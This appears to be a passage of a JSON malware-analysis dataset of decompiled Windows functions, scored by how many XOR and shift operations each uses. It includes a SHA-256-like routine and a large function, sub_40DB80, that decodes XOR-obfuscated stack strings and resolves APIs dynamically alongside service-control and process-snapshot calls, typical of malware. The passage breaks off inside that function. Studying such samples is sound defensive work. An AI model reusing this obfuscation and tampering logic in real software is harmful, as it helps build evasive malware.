__ROL4__(v81, 10) ^ __ROR4__(v81, 13));\n    v3 = v87;\n    v9 = v21 + (v81 & v85 | v86 & (v81 | v85));\n    v83 = v9;\n    if ( v10 >= 16 )\n      break;\n    v2 = v82;\n  }\n  v22 = 64;\n  v89 = 64;\n  do\n  {\n    v23 = *(int *)((char *)v75 + v22);\n    v24 = (char *)&v75[13] + v22;\n    v25 = *(int *)((char *)&v75[13] + v22);\n    v80 = v24;\n    v26 = ((v23 >> 3) ^ __ROR4__(v23, 7) ^ __ROL4__(v23, 14)) + ((v25 >> 10) ^ __ROL4__(v25, 13) ^ __ROL4__(v25, 15));\n    v27 = v82;\n    v28 = v82;\n    v29 = *((_DWORD *)v24 - 5) + *((_DWORD *)v24 - 14) + v26;\n    *(int *)((char *)&v75[15] + v89) = v29;\n    v77 = v29;\n    v30 = *((_DWORD *)v24 - 12);\n    v31 = v84\n        + v29\n        + *(int *)((char *)dword_422840 + v89)\n        + (v88 ^ v27 & (v88 ^ v87))\n        + (__ROR4__(v27, 6) ^ __ROL4__(v28, 7) ^ __ROR4__(v28, 11));\n    v86 += v31;\n    v84 = v31 + (__ROR4__(v83, 2) ^ __ROL4__(v83, 10) ^ __ROR4__(v83, 13)) + (v85 & (v83 | v81) | v83 & v81);\n    v32 = v84;\n    v33 = *((_DWORD *)v80 - 4)\n        + ((v30 >> 3) ^ __ROR4__(v30, 7) ^ __ROL4__(v30, 14))\n        + ((*((_DWORD *)v80 + 1) >> 10) ^ __ROL4__(*((_DWORD *)v80 + 1), 13) ^ __ROL4__(*((_DWORD *)v80 + 1), 15))\n        + v23;\n    v34 = v86;\n    *(int *)((char *)&v75[16] + v89) = v33;\n    v35 = v88\n        + v33\n        + *(int *)((char *)dword_422844 + v89)\n        + (v87 ^ v34 & (v82 ^ v87))\n        + (__ROR4__(v34, 6) ^ __ROL4__(v34, 7) ^ __ROR4__(v34, 11));\n    v85 += v35;\n    v88 = v35 + (__ROR4__(v32, 2) ^ __ROL4__(v32, 10) ^ __ROR4__(v32, 13)) + (v81 & (v83 | v32) | v83 & v84);\n    v36 = *(int *)((char *)&v75[2] + v89);\n    v37 = v30\n        + *(int *)((char *)&v75[10] + v89)\n        + ((v77 >> 10) ^ __ROL4__(v77, 13) ^ __ROL4__(v77, 15))\n        + ((v36 >> 3) ^ __ROR4__(v36, 7) ^ __ROL4__(v36, 14));\n    v38 = v85;\n    *(int *)((char *)&v75[17] + v89) = v37;\n    v79 = v37;\n    v39 = v87\n        + v37\n        + *(int *)((char *)dword_422848 + v89)\n        + (v82 ^ v38 & (v82 ^ v86))\n        + (__ROR4__(v38, 6) ^ __ROL4__(v38, 7) ^ __ROR4__(v38, 11));\n    v81 += v39;\n    v87 = v39 + (__ROR4__(v88, 2) ^ __ROL4__(v88, 10) ^ __ROR4__(v88, 13)) + (v84 & v88 | v83 & (v84 | v88));\n    v40 = *(int *)((char *)&v75[3] + v89);\n    v41 = (v33 >> 10) ^ __ROL4__(v33, 13) ^ __ROL4__(v33, 15);\n    v42 = v81;\n    v43 = v41 + ((v40 >> 3) ^ __ROR4__(v40, 7) ^ __ROL4__(v40, 14));\n    v44 = __ROR4__(v81, 11);\n    v45 = v36 + *(int *)((char *)&v75[11] + v89) + v43;\n    v46 = v87;\n    *(int *)((char *)&v75[18] + v89) = v45;\n    v78 = v45;\n    v47 = v82\n        + v45\n        + *(int *)((char *)dword_42284C + v89)\n        + (v86 ^ v42 & (v86 ^ v85))\n        + (__ROR4__(v42, 6) ^ __ROL4__(v42, 7) ^ v44);\n    v83 += v47;\n    v82 = v47 + (__ROR4__(v46, 2) ^ __ROL4__(v46, 10) ^ __ROR4__(v46, 13)) + (v88 & v46 | v84 & (v88 | v46));\n    v48 = *(int *)((char *)&v75[4] + v89);\n    v49 = v83;\n    v50 = __ROR4__(v83, 11);\n    v51 = v40\n        + *(int *)((char *)&v75[12] + v89)\n        + ((v48 >> 3) ^ __ROR4__(v48, 7) ^ __ROL4__(v48, 14))\n        + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));\n    v52 = v82;\n    *(int *)((char *)&v75[19] + v89) = v51;\n    v79 = v51;\n    v53 = v86\n        + v51\n        + *(int *)((char *)dword_422850 + v89)\n        + (v85 ^ v49 & (v81 ^ v85))\n        + (__ROR4__(v49, 6) ^ __ROL4__(v49, 7) ^ v50);\n    v84 += v53;\n    v86 = v53 + (__ROR4__(v52, 2) ^ __ROL4__(v52, 10) ^ __ROR4__(v52, 13)) + (v88 & (v52 | v87) | v52 & v87);\n    v54 = *(int *)((char *)&v75[5] + v89);\n    v55 = v48\n        + *(int *)((char *)&v75[13] + v89)\n        + ((v54 >> 3) ^ __ROR4__(v54, 7) ^ __ROL4__(v54, 14))\n        + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15));\n    v56 = v84;\n    *(int *)((char *)&v75[20] + v89) = v55;\n    v78 = v55;\n    v57 = v85\n        + v55\n        + *(int *)((char *)dword_422854 + v89)\n        + (v81 ^ v56 & (v83 ^ v81))\n        + (__ROR4__(v56, 6) ^ __ROL4__(v56, 7) ^ __ROR4__(v56, 11));\n    v88 += v57;\n    v85 = v57 + (__ROR4__(v86, 2) ^ __ROL4__(v86, 10) ^ __ROR4__(v86, 13)) + (v87 & (v82 | v86) | v82 & v86);\n    v58 = *((_DWORD *)v80 - 7);\n    v59 = v54 + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));\n    v60 = v88;\n    v61 = *((_DWORD *)v80 + 1) + v59 + ((v58 >> 3) ^ __ROR4__(v58, 7) ^ __ROL4__(v58, 14));\n    v62 = __ROR4__(v88, 11);\n    *(int *)((char *)&v75[21] + v89) = v61;\n    v63 = (v83 ^ v60 & (v84 ^ v83)) + (__ROR4__(v60, 6) ^ __ROL4__(v60, 7) ^ v62);\n    v64 = v82;\n    v65 = v81 + v61 + *(int *)((char *)dword_422858 + v89) + v63;\n    v87 += v65;\n    v81 = v65 + (__ROR4__(v85, 2) ^ __ROL4__(v85, 10) ^ __ROR4__(v85, 13)) + (v82 & (v86 | v85) | v86 & v85);\n    v66 = v87;\n    v67 = v58\n        + v77\n        + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15))\n        + ((*((_DWORD *)v80 - 6) >> 3) ^ __ROR4__(*((_DWORD *)v80 - 6), 7) ^ __ROL4__(*((_DWORD *)v80 - 6), 14));\n    v68 = __ROR4__(v87, 11);\n    *(int *)((char *)&v75[22] + v89) = v67;\n    v69 = v83\n        + v67\n        + *(int *)((char *)dword_42285C + v89)\n        + (v84 ^ v66 & (v88 ^ v84))\n        + (__ROR4__(v66, 6) ^ __ROL4__(v66, 7) ^ v68);\n    v70 = v64 + v69;\n    v71 = v81;\n    v82 = v70;\n    v72 = v69 + (__ROR4__(v81, 2) ^ __ROL4__(v81, 10) ^ __ROR4__(v81, 13));\n    v22 = v89 + 32;\n    v83 = v72 + (v86 & (v81 | v85) | v81 & v85);\n    v89 = v22;\n  }\n  while ( v22 < 0x100 );\n  a1[2] = v76 + v72 + (v86 & (v81 | v85) | v81 & v85);\n  a1[4] += v85;\n  a1[5] += v86;\n  a1[7] += v87;\n  a1[3] += v71;\n  a1[8] += v88;\n  v73 = v84;\n  a1[6] += v70;\n  a1[9] += v73;\n  return 0;\n}\n// 422840: using guessed type int dword_422840[];\n// 422844: using guessed type int dword_422844[];\n// 422848: using guessed type int dword_422848[];\n// 42284C: using guessed type int dword_42284C[];\n// 422850: using guessed type int dword_422850[];\n// 422854: using guessed type int dword_422854[];\n// 422858: using guessed type int dword_422858[];\n// 42285C: using guessed type int dword_42285C[];\n\n"
    },
    {
        "Function": "sub_403660",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "20.00%",
        "Function Body": "\nint __cdecl sub_403660(int a1, unsigned int a2)\n{\n  if ( 32 * *(_DWORD *)(a1 + 4) > a2 )\n    return (*(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * (a2 >> 5)) >> (a2 & 0x1F)) & 1;\n  else\n    return 0;\n}\n\n"
    },
    {
        "Function": "sub_401120",
        "Total XOR and shift operations": 1,
        "XOR operations": 1,
        "Shift operations": 0,
        "Operation percentage": "14.29%",
        "Function Body": "\nchar __thiscall sub_401120(_BYTE *this, char a2)\n{\n  return a2 ^ *this;\n}\n\n"
    },
    {
        "Function": "sub_404640",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "14.29%",
        "Function Body": "\nunsigned int __cdecl sub_404640(int a1)\n{\n  return (sub_401F60(a1) + 7) >> 3;\n}\n\n"
    },
    {
        "Function": "sub_4013C0",
        "Total XOR and shift operations": 5,
        "XOR operations": 0,
        "Shift operations": 5,
        "Operation percentage": "12.82%",
        "Function Body": "\nunsigned int __stdcall sub_4013C0(unsigned __int64 a1, __int64 a2)\n{\n  unsigned __int64 v3; // rtt\n  unsigned int v4; // ecx\n  unsigned int v5; // ebx\n  unsigned __int64 v6; // rax\n  char v7; // cf\n  unsigned int v8; // esi\n  unsigned __int64 v9; // rax\n\n  if ( HIDWORD(a2) )\n  {\n    v4 = HIDWORD(a2);\n    v5 = a2;\n    v6 = a1;\n    do\n    {\n      v7 = v4 & 1;\n      v4 >>= 1;\n      v5 = (v5 >> 1) | (v7 << 31);\n      v6 >>= 1;\n    }\n    while ( v4 );\n    v8 = v6 / v5;\n    v9 = v8 * (unsigned __int64)(unsigned int)a2;\n    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )\n      --v8;\n    return v8;\n  }\n  else\n  {\n    LODWORD(v3) = a1;\n    HIDWORD(v3) = HIDWORD(a1) % (unsigned int)a2;\n    return v3 / (unsigned int)a2;\n  }\n}\n\n"
    },
    {
        "Function": "sub_40DB80",
        "Total XOR and shift operations": 371,
        "XOR operations": 370,
        "Shift operations": 1,
        "Operation percentage": "7.95%",
        "Function Body": "\nvoid __cdecl __noreturn sub_40DB80(\n        int a1,\n        int a2,\n        int a3,\n        int a4,\n        LPCSTR lpProcName,\n        int a6,\n        int a7,\n        int a8,\n        int a9,\n        int a10,\n        int a11,\n        int a12,\n        int a13,\n        int a14,\n        int a15,\n        int a16,\n        int a17,\n        int a18,\n        int a19,\n        int a20,\n        int a21,\n        int a22,\n        int a23,\n        int a24,\n        int a25,\n        int a26,\n        int a27,\n        int a28,\n        int a29,\n        int a30,\n        int a31,\n        int a32,\n        int a33,\n        int a34,\n        int a35,\n        int a36,\n        int a37,\n        int a38,\n        int a39,\n        int a40,\n        int a41,\n        int a42,\n        int a43,\n        int a44,\n        int a45,\n        int a46,\n        int a47,\n        int a48,\n        int a49,\n        int a50,\n        int a51,\n        int a52,\n        int a53,\n        int a54,\n        int a55,\n        int a56,\n        int a57,\n        int a58,\n        int a59,\n        int a60,\n        int a61,\n        int a62,\n        int a63)\n{\n  int a64; // [esp+104h] [ebp+104h] BYREF\n  char v64; // al\n  char v65; // ah\n  char v66; // cl\n  char v67; // cl\n  char v68; // ah\n  char v69; // ch\n  char v70; // dh\n  char v71; // cl\n  char v72; // al\n  char v73; // cl\n  char v74; // ch\n  char v75; // dh\n  char v76; // cl\n  char v77; // cl\n  char v78; // al\n  char v79; // al\n  char v80; // dl\n  char v81; // ah\n  char v82; // ch\n  char v83; // al\n  char v84; // cl\n  char v85; // cl\n  char v86; // ah\n  char v87; // ch\n  char v88; // dh\n  char v89; // cl\n  char v90; // cl\n  char v91; // al\n  char v92; // ch\n  char v93; // dh\n  char v94; // cl\n  char v95; // cl\n  char v96; // al\n  char v97; // cl\n  char v98; // cl\n  char v99; // ah\n  char v100; // ch\n  char v101; // dh\n  char v102; // al\n  char v103; // cl\n  char v104; // ah\n  char v105; // dh\n  char v106; // cl\n  char v107; // al\n  char v108; // cl\n  char v109; // cl\n  char v110; // cl\n  char v111; // al\n  char v112; // al\n  char v113; // dl\n  unsigned int v114; // ecx\n  unsigned int v115; // ecx\n  unsigned int v116; // ecx\n  char v117; // cl\n  char v118; // cl\n  char v119; // al\n  char v120; // dl\n  char v121; // al\n  char v122; // cl\n  char v123; // dh\n  char v124; // dl\n  char v125; // al\n  unsigned int v126; // ecx\n  unsigned int v127; // ecx\n  unsigned int v128; // ecx\n  char v129; // al\n  char v130; // cl\n  char v131; // al\n  char v132; // al\n  char v133; // cl\n  unsigned int v134; // ecx\n  unsigned int v135; // ecx\n  unsigned int v136; // ecx\n  char v137; // cl\n  char v138; // cl\n  char v139; // dl\n  char v140; // ah\n  char v141; // dh\n  char v142; // ch\n  char v143; // cl\n  char v144; // cl\n  char v145; // ah\n  char v146; // dh\n  char v147; // al\n  char v148; // dl\n  unsigned int v149; // ecx\n  unsigned int v150; // ecx\n  char v151; // al\n  char v152; // cl\n  char v153; // ah\n  char v154; // dh\n  char v155; // al\n  unsigned int v156; // ecx\n  unsigned int v157; // ecx\n  unsigned int v158; // ecx\n  unsigned int v159; // ecx\n  unsigned int v160; // ecx\n  unsigned int v161; // ecx\n  unsigned int v162; // ecx\n  unsigned int v163; // ecx\n  unsigned int v164; // ecx\n  unsigned int v165; // ecx\n  unsigned int v166; // ecx\n  char v167; // dl\n  unsigned int v168; // ecx\n  char v169; // cl\n  char v170; // cl\n  char v171; // al\n  char v172; // al\n  char v173; // al\n  char v174; // dl\n  char v175; // ah\n  char v176; // al\n  char v177; // cl\n  char v178; // al\n  char v179; // cl\n  char v180; // al\n  char v181; // cl\n  char v182; // al\n  char v183; // dl\n  char v184; // dl\n  unsigned int v185; // ecx\n  unsigned int v186; // ecx\n  unsigned int v187; // ecx\n  unsigned int v188; // ecx\n  unsigned int v189; // ecx\n  unsigned int v190; // ecx\n  unsigned int v191; // ecx\n  unsigned int v192; // ecx\n  char v193; // al\n  char v194; // dh\n  char v195; // cl\n  char v196; // cl\n  char v197; // al\n  char v198; // ah\n  char v199; // dh\n  char v200; // al\n  char v201; // dl\n  unsigned int v202; // ecx\n  char v203; // cl\n  char v204; // cl\n  char v205; // al\n  char v206; // dh\n  char v207; // al\n  unsigned int v208; // ecx\n  unsigned int v209; // ecx\n  char v210; // dl\n  unsigned int v211; // ecx\n  char v212; // dl\n  unsigned int v213; // ecx\n  char v214; // cl\n  char v215; // cl\n  char v216; // ah\n  char v217; // dh\n  char v218; // dl\n  char v219; // al\n  unsigned int v220; // ecx\n  unsigned int v221; // ecx\n  char v222; // dl\n  unsigned int v223; // ecx\n  char v224; // cl\n  char v225; // cl\n  char v226; // ah\n  char v227; // dh\n  char v228; // al\n  char v229; // dl\n  unsigned int v230; // ecx\n  SC_HANDLE v231; // eax\n  int v232; // esi\n  SC_HANDLE v233; // edi\n  void (__stdcall *v234)(SC_HANDLE); // edi\n  unsigned int v235; // ecx\n  unsigned int v236; // edx\n  unsigned int v237; // ecx\n  unsigned int v238; // ecx\n  char v239; // al\n  char v240; // al\n  char v241; // cl\n  char v242; // dl\n  char v243; // ah\n  char v244; // dh\n  char v245; // ch\n  char v246; // al\n  unsigned int v247; // ecx\n  char v248; // cl\n  char v249; // cl\n  char v250; // dh\n  char v251; // al\n  char v252; // dl\n  unsigned int v253; // ecx\n  char v254; // cl\n  char v255; // cl\n  char v256; // ch\n  char v257; // al\n  char v258; // cl\n  char v259; // cl\n  char v260; // al\n  char v261; // al\n  char v262; // cl\n  char v263; // cl\n  char v264; // al\n  char v265; // al\n  char v266; // cl\n  char v267; // al\n  char v268; // dh\n  char v269; // cl\n  char v270; // cl\n  char v271; // al\n  char v272; // cl\n  char v273; // cl\n  char v274; // cl\n  char v275; // cl\n  char v276; // al\n  char v277; // cl\n  unsigned int v278; // esi\n  char *v279; // eax\n  unsigned int v280; // edi\n  char *v281; // eax\n  char *v282; // esi\n  unsigned int v283; // edi\n  char *v284; // eax\n  char *v285; // esi\n  unsigned int v286; // edi\n  char *v287; // eax\n  char *v288; // esi\n  unsigned int v289; // edi\n  char *v290; // eax\n  char *v291; // esi\n  unsigned int v292; // edi\n  char *v293; // eax\n  char *v294; // esi\n  unsigned int v295; // edi\n  char *v296; // eax\n  char *v297; // esi\n  unsigned int v298; // edi\n  char *v299; // eax\n  char *v300; // esi\n  unsigned int v301; // edi\n  char *v302; // eax\n  char *v303; // esi\n  unsigned int v304; // edi\n  char *v305; // eax\n  char *v306; // esi\n  unsigned int i; // edi\n  char *v308; // eax\n  char *v309; // esi\n  unsigned int v310; // edi\n  char *v311; // eax\n  char *v312; // esi\n  unsigned int v313; // edi\n  char *v314; // eax\n  char *v315; // esi\n  unsigned int v316; // edi\n  char *v317; // eax\n  char *v318; // esi\n  unsigned int v319; // edi\n  char *v320; // eax\n  char *v321; // esi\n  unsigned int v322; // edi\n  char *v323; // eax\n  char *v324; // esi\n  unsigned int v325; // edi\n  char *v326; // eax\n  char *v327; // esi\n  unsigned int v328; // edi\n  char *v329; // eax\n  char *v330; // esi\n  unsigned int v331; // edi\n  char *v332; // eax\n  char *v333; // esi\n  unsigned int v334; // edi\n  char *v335; // eax\n  char *v336; // esi\n  unsigned int v337; // edi\n  char *v338; // eax\n  char *v339; // esi\n  unsigned int v340; // edi\n  char *v341; // eax\n  char *v342; // esi\n  unsigned int v343; // edi\n  char *v344; // eax\n  char *v345; // esi\n  unsigned int v346; // edi\n  char *v347; // eax\n  char *v348; // esi\n  unsigned int v349; // edi\n  char *v350; // eax\n  char *v351; // esi\n  unsigned int v352; // edi\n  char *v353; // eax\n  char *v354; // esi\n  unsigned int v355; // edi\n  char *v356; // eax\n  char *v357; // esi\n  unsigned int v358; // edi\n  char *v359; // eax\n  char *v360; // esi\n  unsigned int v361; // edi\n  char *v362; // eax\n  char *v363; // esi\n  unsigned int v364; // edi\n  char *v365; // eax\n  char *v366; // esi\n  unsigned int v367; // edi\n  char *v368; // eax\n  char *v369; // esi\n  unsigned int j; // edi\n  char *v371; // eax\n  char *v372; // esi\n  unsigned int v373; // edi\n  char *v374; // eax\n  char *v375; // esi\n  unsigned int v376; // edi\n  char *v377; // eax\n  char *v378; // esi\n  unsigned int v379; // edi\n  char *v380; // eax\n  char *v381; // esi\n  unsigned int v382; // edi\n  char *v383; // eax\n  char *v384; // esi\n  unsigned int v385; // edi\n  char *v386; // eax\n  char *v387; // esi\n  unsigned int v388; // edi\n  char *v389; // eax\n  char *v390; // esi\n  unsigned int v391; // edi\n  char *v392; // eax\n  char *v393; // esi\n  unsigned int k; // edi\n  char *v395; // eax\n  char *v396; // esi\n  unsigned int v397; // edi\n  char *v398; // eax\n  char *v399; // esi\n  unsigned int m; // edi\n  char *v401; // eax\n  char *v402; // esi\n  unsigned int v403; // edi\n  char *v404; // eax\n  char *v405; // esi\n  unsigned int v406; // edi\n  char *v407; // eax\n  char *v408; // esi\n  unsigned int v409; // edi\n  char *v410; // eax\n  char *v411; // esi\n  unsigned int v412; // edi\n  char *v413; // eax\n  char *v414; // esi\n  unsigned int v415; // edi\n  char *v416; // eax\n  char *v417; // esi\n  unsigned int v418; // edi\n  char *v419; // eax\n  char *v420; // esi\n  unsigned int v421; // edi\n  char *v422; // eax\n  char *v423; // esi\n  unsigned int v424; // edi\n  char *v425; // eax\n  char *v426; // esi\n  unsigned int v427; // edi\n  char *v428; // eax\n  char *v429; // esi\n  unsigned int v430; // edi\n  char *v431; // eax\n  char *v432; // esi\n  unsigned int v433; // edi\n  char *v434; // eax\n  char *v435; // esi\n  unsigned int n; // edi\n  char *v437; // eax\n  char *v438; // esi\n  unsigned int ii; // edi\n  char *v440; // eax\n  char *v441; // esi\n  unsigned int v442; // edi\n  char *v443; // eax\n  char *v444; // esi\n  unsigned int v445; // edi\n  char *v446; // eax\n  char *v447; // esi\n  unsigned int v448; // edi\n  char *v449; // eax\n  char *v450; // esi\n  unsigned int v451; // edi\n  char *v452; // eax\n  char *v453; // esi\n  unsigned int v454; // edi\n  char *v455; // eax\n  char *v456; // esi\n  unsigned int v457; // edi\n  char *v458; // eax\n  char *v459; // esi\n  unsigned int v460; // edi\n  char *v461; // eax\n  char *v462; // esi\n  unsigned int v463; // edi\n  char *v464; // eax\n  char *v465; // esi\n  unsigned int v466; // edi\n  char *v467; // eax\n  char *v468; // esi\n  unsigned int v469; // edi\n  char *v470; // eax\n  char *v471; // esi\n  unsigned int v472; // edi\n  char *v473; // eax\n  char *v474; // esi\n  unsigned int v475; // edi\n  char *v476; // eax\n  char *v477; // esi\n  unsigned int v478; // edi\n  char *v479; // eax\n  char *v480; // esi\n  unsigned int v481; // edi\n  char *v482; // eax\n  char *v483; // esi\n  unsigned int v484; // edi\n  char *v485; // eax\n  char *v486; // esi\n  unsigned int jj; // edi\n  char *v488; // eax\n  char *v489; // esi\n  unsigned int v490; // edi\n  char *v491; // eax\n  char *v492; // esi\n  unsigned int v493; // edi\n  char *v494; // eax\n  char *v495; // esi\n  unsigned int v496; // edi\n  char *v497; // eax\n  char *v498; // esi\n  unsigned int v499; // edi\n  char *v500; // eax\n  char *v501; // esi\n  unsigned int v502; // edi\n  char *v503; // eax\n  char *v504; // esi\n  unsigned int v505; // edi\n  char *v506; // eax\n  char *v507; // esi\n  unsigned int v508; // edi\n  char *v509; // eax\n  char *v510; // esi\n  unsigned int v511; // edi\n  char *v512; // eax\n  char *v513; // esi\n  unsigned int kk; // edi\n  char *v515; // eax\n  char *v516; // esi\n  HANDLE Toolhelp32Snapshot; // eax\n  int v518; // eax\n  char *v519; // eax\n  unsigned int v520; // esi\n  char *v521; // edi\n  const CHAR *v522; // eax\n  void *v523; // esi\n  int v524; // eax\n  unsigned int v525; // edi\n  char *v526; // esi\n  unsigned int v527; // edi\n  char *v528; // esi\n  const CHAR *v529; // eax\n  HMODULE ModuleHandleA; // eax\n  FARPROC ProcAddress; // eax\n  unsigned int v532; // edi\n  char *v533; // esi\n  unsigned int v534; // edi\n  char *v535; // esi\n  unsigned int v536; // edi\n  char *v537; // esi\n  unsigned int v538; // edi\n  char *v539; // esi\n  unsigned int v540; // edi\n  char *v541; // esi\n  unsigned int v542; // edi\n  char *v543; // esi\n  unsigned int v544; // edi\n  char *v545; // esi\n  unsigned int v546; // edi\n  char *v547; // esi\n  unsigned int v548; // edi\n  char *v549; // esi\n  char *v550; // eax\n  int v551; // esi\n  const void *v552; // edi\n  int v553; // eax\n  unsigned int v554; // edi\n  char *v555; // esi\n  const CHAR *v556; // eax\n  int v557; // eax\n  unsigned int v558; // edi\n  char *v559; // esi\n  unsigned int v560; // edi\n  char *v561; // esi\n  const CHAR *v562; // eax\n  HMODULE v563; // eax\n  FARPROC v564; // eax\n  SC_HANDLE v565; // [esp-Ch] [ebp-Ch]\n  int v566; // [esp-Ch] [ebp-Ch]\n  SC_HANDLE v567; // [esp-Ch] [ebp-Ch]\n  int v568; // [esp-Ch] [ebp-Ch]\n  int v569; // [esp-Ch] [ebp-Ch]\n  const CHAR *v570; // [esp-Ch] [ebp-Ch]\n  const CHAR *v571; // [esp-Ch] [ebp-Ch]\n  char _0; // [esp+0h] [ebp+0h]\n  char vars3; // [esp+3h] [ebp+3h]\n  char vars3a; // [esp+3h] [ebp+3h]\n  char vars3b; // [esp+3h] [ebp+3h]\n  char vars3c; // [esp+3h] [ebp+3h]\n  char vars3d; // [esp+3h] [ebp+3h]\n  char vars3e; // [esp+3h] [ebp+3h]\n  char vars3f; // [esp+3h] [ebp+3h]\n  char *TickCount; // [esp+4h] [ebp+4h]\n  void *v581; // [esp+Ch] [ebp+Ch]\n  char v582; // [esp+Ch] [ebp+Ch]\n  char v583; // [esp+Ch] [ebp+Ch]\n  char v584; // [esp+Ch] [ebp+Ch]\n  char v585; // [esp+Ch] [ebp+Ch]\n  char v586; // [esp+Ch] [ebp+Ch]\n  char v587; // [esp+Ch] [ebp+Ch]\n  char v588; // [esp+Ch] [ebp+Ch]\n  char v589; // [esp+Ch] [ebp+Ch]\n  char v590; // [esp+Ch] [ebp+Ch]\n  char v591; // [esp+Ch] [ebp+Ch]\n  char v592; // [esp+Ch] [ebp+Ch]\n  char v593; // [esp+Ch] [ebp+Ch]\n  char v594; // [esp+Ch] [ebp+Ch]\n  char v595; // [esp+Ch] [ebp+Ch]\n  char v596; // [esp+Ch] [ebp+Ch]\n\n  sub_401170(0x1438u, _0);\n  sub_40CD80();\n  LOBYTE(STACK[0x60B]) = 70;\n  LOBYTE(STACK[0x60C]) = LOBYTE(STACK[0x60B]) ^ 0x31;\n  v64 = STACK[0x60B];\n  v65 = LOBYTE(STACK[0x60B]) ^ 0x36;\n  LOBYTE(STACK[0x666]) = 79;\n  LOBYTE(STACK[0x60D]) = v64 ^ 0x34;\n  LOBYTE(STACK[0x60F]) = v65;\n  LOBYTE(STACK[0x60E]) = v64 ^ 0x27;\n  LOBYTE(STACK[0x610]) = v64 ^ 0x36;\n  v66 = LOBYTE(STACK[0x666]) ^ 0x2A;\n  LOBYTE(STACK[0x612]) = LOBYTE(STACK[0x60B]) ^ 0x34;\n  LOBYTE(STACK[0x668]) = v66;\n  v67 = STACK[0x666];\n  LOBYTE(STACK[0x667]) = LOBYTE(STACK[0x666]) ^ 0xB;\n  v68 = v67 ^ 0x18;\n  v69 = v67 ^ 0x2E;\n  LOBYTE(STACK[0x611]) = v64 ^ 0x23;\n  LOBYTE(STACK[0x66D]) = v67 ^ 0x2C;\n  v70 = v67 ^ 0x3B;\n  LOBYTE(STACK[0x6A0]) = 60;\n  LOBYTE(STACK[0x66E]) = v67 ^ 0x27;\n  LOBYTE(STACK[0x669]) = v67 ^ 0x29;\n  v71 = LOBYTE(STACK[0x6A0]) ^ 0x5F;\n  v72 = v71;\n  LOBYTE(STACK[0x66A]) = v68;\n  LOBYTE(STACK[0x6A2]) = v71;\n  v73 = STACK[0x6A0];\n  LOBYTE(STACK[0x66B]) = v69;\n  LOBYTE(STACK[0x613]) = 0;\n  LOBYTE(STACK[0x66F]) = 0;\n  LOBYTE(STACK[0x66C]) = v70;\n  v74 = v73 ^ 0x48;\n  LOBYTE(STACK[0x613]) = 0;\n  LOBYTE(STACK[0x66F]) = 0;\n  LOBYTE(STACK[0x6A9]) = 0;\n  LOBYTE(STACK[0x6A1]) = v72;\n  LOBYTE(STACK[0x6A3]) = v73 ^ 0x79;\n  LOBYTE(STACK[0x6A4]) = v73 ^ 0x4A;\n  v75 = v73 ^ 0x71;\n  LOBYTE(STACK[0x6AA]) = 72;\n  LOBYTE(STACK[0x6A7]) = v73 ^ 0x5B;\n  LOBYTE(STACK[0x6A8]) = v73 ^ 0x4E;\n  v76 = LOBYTE(STACK[0x6AA]) ^ 0x2B;\n  LOBYTE(STACK[0x6AB]) = v76;\n  LOBYTE(STACK[0x6AC]) = v76;\n  v77 = STACK[0x6AA];\n  v78 = LOBYTE(STACK[0x6AA]) ^ 0x2F;\n  LOBYTE(STACK[0x6A5]) = v74;\n  LOBYTE(STACK[0x6B1]) = v78;\n  LOBYTE(STACK[0x6A6]) = v75;\n  LOBYTE(STACK[0x6B2]) = v77 ^ 0x3A;\n  LOBYTE(STACK[0x614]) = 27;\n  LOBYTE(STACK[0x6AD]) = v77 ^ 0x1B;\n  LOBYTE(STACK[0x6AE]) = v77 ^ 0x2D;\n  LOBYTE(STACK[0x6AF]) = v77 ^ 0x3C;\n  LOBYTE(STACK[0x615]) = LOBYTE(STACK[0x614]) ^ 0x48;\n  v79 = STACK[0x614];\n  v80 = LOBYTE(STACK[0x614]) ^ 0x6D;\n  LOBYTE(STACK[0x6B0]) = v77 ^ 5;\n  LOBYTE(STACK[0x5C6]) = 122;\n  v81 = v79 ^ 0x49;\n  LOBYTE(STACK[0x616]) = v79 ^ 0x7A;\n  LOBYTE(STACK[0x6B3]) = 0;\n  LOBYTE(STACK[0x61A]) = v79 ^ 0x7A;\n  v82 = v79 ^ 0x74;\n  LOBYTE(STACK[0x61C]) = 0;\n  LOBYTE(STACK[0x61B]) = LOBYTE(STACK[0x614]) ^ 0x76;\n  v83 = LOBYTE(STACK[0x5C6]) ^ 0x29;\n  v84 = LOBYTE(STACK[0x5C6]) ^ 0xB;\n  LOBYTE(STACK[0x617]) = v80;\n  LOBYTE(STACK[0x618]) = v81;\n  LOBYTE(STACK[0x619]) = v82;\n  LOBYTE(STACK[0x5C8]) = v84;\n  v85 = STACK[0x5C6];\n  LOBYTE(STACK[0x6A9]) = 0;\n  LOBYTE(STACK[0x6B3]) = 0;\n  LOBYTE(STACK[0x61C]) = 0;\n  LOBYTE(STACK[0x5CF]) = 0;\n  LOBYTE(STACK[0x5C7]) = v83;\n  LOBYTE(STACK[0x6B4]) = 38;\n  LOBYTE(STACK[0x5CD]) = v85 ^ 0xC;\n  v86 = v85 ^ 9;\n  v87 = v85 ^ 0x1F;\n  v88 = v85 ^ 8;\n  LOBYTE(STACK[0x5CE]) = v85 ^ 8;\n  LOBYTE(STACK[0x5C9]) = v85 ^ 0x16;\n  v89 = LOBYTE(STACK[0x6B4]) ^ 0x57;\n  LOBYTE(STACK[0x6B5]) = LOBYTE(STACK[0x6B4]) ^ 0x55;\n  LOBYTE(STACK[0x6B6]) = v89;\n  v90 = STACK[0x6B4];\n  v91 = LOBYTE(STACK[0x6B4]) ^ 0x48;\n  LOBYTE(STACK[0x5CA]) = v86;\n  LOBYTE(STACK[0x6BB]) = v91;\n  LOBYTE(STACK[0x5CB]) = v87;\n  LOBYTE(STACK[0x5CC]) = v88;\n  v92 = v90 ^ 0x41;\n  LOBYTE(STACK[0x6B7]) = v90 ^ 0x4A;\n  LOBYTE(STACK[0x6BC]) = v90 ^ 0x52;\n  v93 = v90 ^ 0x43;\n  LOBYTE(STACK[0x6BE]) = 109;\n  